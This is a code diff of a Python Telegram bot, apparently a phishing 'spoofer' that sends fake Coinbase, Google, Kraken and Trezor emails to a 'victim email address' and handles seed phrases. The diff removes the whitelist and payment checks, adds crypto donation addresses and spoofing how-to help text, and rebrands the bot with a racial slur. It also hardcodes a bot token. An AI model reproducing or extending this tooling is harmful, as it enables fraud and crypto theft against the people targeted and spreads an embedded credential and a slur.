@@ -2,7 +2,7 @@ import logging
 import sys
 import json
 import traceback
-from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -36,7 +36,6 @@ file_handler.setFormatter(formatter)
 file_logger.addHandler(file_handler)
 
 email_count_file = "email_count.json"
-whitelist_file = "whitelist.json"
 log_file_path = "bot_logs.log"
 file_handler = logging.FileHandler(log_file_path, mode="a", encoding="utf-8")
 
@@ -60,7 +59,6 @@ DISPLAY_NAME, RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE, LINK, SPOOF_EMAI
 
 global_email_count = 0
 user_email_counts = {}
-whitelisted_users = []
 
 HTML_TEMPLATE_PATH = "coinbase_template.html"
 HTML_WALLET_TEMPLATE_PATH = "coinbase_wallet_template.html"
@@ -68,32 +66,6 @@ HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
 HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
 HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
 HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"
-balance_file = "balance.json"
-user_balances = {}
-
-def load_balances():
-    global user_balances
-    if os.path.exists(balance_file):
-        with open(balance_file, "r") as file:
-            user_balances = json.load(file)
-    else:
-        user_balances = {}
-
-def save_balances():
-    with open(balance_file, "w") as file:
-        json.dump(user_balances, file)
-
-load_balances()
-
-def deduct_balance(user_id: int, amount: float = 5.0) -> bool:
-    user_id_str = str(user_id)
-    if user_id_str not in user_balances:
-        return False
-    if user_balances[user_id_str] < amount:
-        return False
-    user_balances[user_id_str] -= amount
-    save_balances()
-    return True
 
 def load_email_counts():
     global global_email_count, user_email_counts
@@ -111,18 +83,6 @@ def save_email_counts():
         json.dump(
             {"global_count": global_email_count, "user_counts": user_email_counts}, file
         )
-
-def load_whitelist():
-    global whitelisted_users
-    if os.path.exists(whitelist_file):
-        with open(whitelist_file, "r") as file:
-            whitelisted_users = json.load(file)
-    else:
-        whitelisted_users = [ADMIN_ID]
-
-def save_whitelist():
-    with open(whitelist_file, "w") as file:
-        json.dump(whitelisted_users, file)
 
 
 def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
@@ -145,97 +105,94 @@ def log_email_details(update: Update, command_type: str, victim_email: str, extr
 
     file_logger.info(log_message)
 
-async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("You are not authorized to use this command.")
-        return
-    if len(context.args) != 2 or not context.args[1].isdigit():
-        await update.message.reply_text("Usage: /add_balance <user_id> <amount>")
-        return
-
-    target_user_id = str(context.args[0])
-    amount = float(context.args[1])
-    if target_user_id in user_balances:
-        user_balances[target_user_id] += amount
-    else:
-        user_balances[target_user_id] = amount
-    save_balances()
-    await update.message.reply_text(
-        f"Added ${amount} to user {target_user_id}'s balance."
+async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    donate_message = (
+        "BTC: bc1qj8f5r29ksq3uq62eu6ycr9qt9sfz9hjkcvz00m\n"
+        "ETH: 0x86FF30eF6fc3652345EEe0B01482a15FecE5DE00\n"
+        "SOL: CmnkLiqxRh5cAMWLx3EewLn3Mpxw7KJbj7ox6hGPKX3p\n"
+        "LTC: LNQpZvqp2BkaDoSviNMU7zATzNxxUyhvfP"
     )
+    await update.message.reply_text(donate_message)
+
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    user_count = user_email_counts.get(str(user_id), 0)
-    balance = user_balances.get(str(user_id), 0)
     start_message = (
-        "Welcome to @starmailer\n"
-        "Support: @lovecoinbase\n\n"
+        "Welcome to @NiggaSpoofer\n"
+        "Support: @un0h4na\n\n"
+        "This project is funded by donations!\n"
+        "If you want me to eat and keep the SMTPs fresh, feel free to do /donate\n\n"
         "[Info]\n\n"
         f"• Mails sent: {global_email_count}\n"
-        f"• Your mails sent: {user_count}\n"
-        f"• Your balance: ${balance:.2f}\n\n"
-        "[Misc]\n\n"
-        "• /id - Get your user id.\n"
-        "• /cancel - Cancel sending your mail.\n"
-        "• /custom_mail - Send your own mail\n\n"
-        "[Coinbase]\n\n"
-        "• /employee_coinbase - Send a case review coinbase email.\n"
-        "• /wallet_coinbase - Send a coinbase wallet email.\n"
-        "• /secure_coinbase - Send a secure link coinbase email.\n"
-        "• /coinbase_delay - Send a delay email for manual review.\n\n"
-        "[Google]\n\n"
-        "• /employee_google - Send a Google employee email.\n\n"
-        "[Kraken]\n\n"
-        "• /employee_kraken - Send a Kraken employee email.\n\n"
-        "[Trezor]\n\n"
-        "• /employee_trezor - Send a trezor employee email.\n\n"
-
+        f"• Your mails sent: {user_email_counts.get(str(update.effective_user.id), 0)}\n"
     )
-    await update.message.reply_text(start_message)
+
+    keyboard = [
+        [KeyboardButton("Misc"), KeyboardButton("Coinbase")],
+        [KeyboardButton("Other"), KeyboardButton("/donate")]
+    ]
+
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text(start_message, reply_markup=reply_markup)
+
+async def misc_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    keyboard = [
+        [KeyboardButton("/id"), KeyboardButton("/help")],
+        [KeyboardButton("Back to Main Menu")]
+    ]
+
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text("Misc Menu:", reply_markup=reply_markup)
+
+async def coinbase_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    keyboard = [
+        [KeyboardButton("/employee_coinbase"), KeyboardButton("/wallet_coinbase")],
+        [KeyboardButton("/secure_coinbase"), KeyboardButton("/coinbase_delay")],
+        [KeyboardButton("Back to Main Menu")]
+    ]
+
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text("Coinbase Menu:", reply_markup=reply_markup)
+
+async def other_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    keyboard = [
+        [KeyboardButton("/employee_google")],
+        [KeyboardButton("/employee_kraken")],
+        [KeyboardButton("/employee_trezor")],
+        [KeyboardButton("/custom_mail")],
+        [KeyboardButton("Back to Main Menu")]
+    ]
+
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    await update.message.reply_text("Other Menu:", reply_markup=reply_markup)
+
+async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await start(update, context)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     help_text = (
-        "Welcome to star mailer, i have no clue what to put here so just enjoy it."
+        "Welcome to *Nigga Spoofer*\\! 🎭\n\n"
+        "Please check @niggaspoofer for frequently asked questions\\. For custom spoofings, follow this protocol:\n\n"
+        "1\\. *Directory Spoofing*:\n"
+        "   Let's say you want to spoof `playboicarti\\.com`\\. For your email, you'll want it to end in one of the directories\\.\n"
+        "   Example: Instead of `@playboicarti\\.com`, use `@playboicarti\\.com/tour`\\.\n\n"
+        "2\\. *Admin Prefix*:\n"
+        "   At the start of your email, add `admin`\\. Almost every website has an admin email\\.\n\n"
+        "3\\. *Research*:\n"
+        "   For example, `ice\\.gov` has an email `iceprivacy@ice\\.gov`\\. \\(Google: `\\(company you want to spoof\\) \\+ email` to find these\\.\\)\n"
+        "   Then, just add a directory like `/help` and spoof `iceprivacy@ice\\.gov/help`\\.\n\n"
+        "I won't explain the technicals here because it would suck\\! 😉 Happy spoofing\\! 🚀"
     )
-    await update.message.reply_text(help_text)
+    await update.message.reply_text(help_text, parse_mode="MarkdownV2")
 
 async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     await update.message.reply_text(f"Your user ID is: {user_id}")
 
-def check_auth(update: Update) -> bool:
-    return update.effective_user.id in whitelisted_users
 
-async def unauthorized_access(
-    update: Update, context: ContextTypes.DEFAULT_TYPE
-) -> None:
-    await update.message.reply_text("Unauthorized access.")
 
-async def whitelist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("You are not authorized to use this command.")
-        return
-    if len(context.args) != 1 or not context.args[0].isdigit():
-        await update.message.reply_text("Please provide a valid user ID to whitelist.")
-        return
-
-    new_user_id = int(context.args[0])
-    if new_user_id in whitelisted_users:
-        await update.message.reply_text(f"User {new_user_id} is already whitelisted.")
-    else:
-        whitelisted_users.append(new_user_id)
-        save_whitelist()
-        await update.message.reply_text(
-            f"User {new_user_id} has been whitelisted successfully."
-        )
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    if not check_auth(update):
-        await unauthorized_access(update)
-        return ConversationHandler.END
+
     await update.message.reply_text("Email sending cancelled.")
     context.user_data.clear()
     return ConversationHandler.END
@@ -285,14 +242,7 @@ async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Initiates the custom email flow."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
 
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text("Insufficient balance. Please top up your balance.")
-        return ConversationHandler.END
 
     await update.message.reply_text("Enter the victim email address:")
     return CUSTOM_VICTIM_EMAIL
@@ -365,16 +315,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Coinbase wallet email, asks only for the seed phrase."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
+    
 
     context.user_data.clear()
     context.user_data["conversation"] = "wallet_coinbase"
@@ -382,17 +323,6 @@ async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     return RECIPIENTS
 
 async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Google employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_google"
@@ -401,16 +331,7 @@ async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for secure Coinbase emails with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
 
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "secure_coinbase"
@@ -419,16 +340,7 @@ async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Coinbase employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
 
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_coinbase"
@@ -764,16 +676,7 @@ async def send_employee_google_email(
 
 async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Kraken employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
 
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_kraken"
@@ -782,16 +685,6 @@ async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Trezor employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "employee_trezor"
@@ -915,16 +808,6 @@ async def send_employee_kraken_email(
 
 async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Coinbase delay email."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
 
     context.user_data.clear()
     context.user_data["conversation"] = "coinbase_delay"
@@ -1005,13 +888,11 @@ def send_email_through_smtp(display_name, smtp_username, subject, msg, recipient
 
 def main():
     load_email_counts()
-    load_whitelist()
 
-    TOKEN = "7521260370:AAFYaCxf8Ssv3Uimb3IbeLJlS1c75xinv2U"
+
+    TOKEN = "8161193786:AAEw62XKG_beqNdVGGDBH4eEji6KLFLBHNU"
     application = ApplicationBuilder().token(TOKEN).build()
 
-    application.add_handler(CommandHandler("whitelist", whitelist))
-    application.add_handler(CommandHandler("add_balance", add_balance))
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("id", get_user_id))
@@ -1142,6 +1023,7 @@ def main():
 
 
     application.add_handler(custom_mail_handler)
+    application.add_handler(CommandHandler("donate", donate))
     application.add_handler(coinbase_delay_handler)
     application.add_handler(employee_trezor_handler)
     application.add_handler(employee_kraken_handler)
@@ -1149,6 +1031,11 @@ def main():
     application.add_handler(employee_coinbase_handler)
     application.add_handler(secure_coinbase_handler)
     application.add_handler(employee_google_handler)
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.Regex("Misc"), misc_menu))
+    application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
+    application.add_handler(MessageHandler(filters.Regex("Other"), other_menu))
+    application.add_handler(MessageHandler(filters.Regex("Back to Main Menu"), back_to_main_menu))
 
     application.run_polling()
 
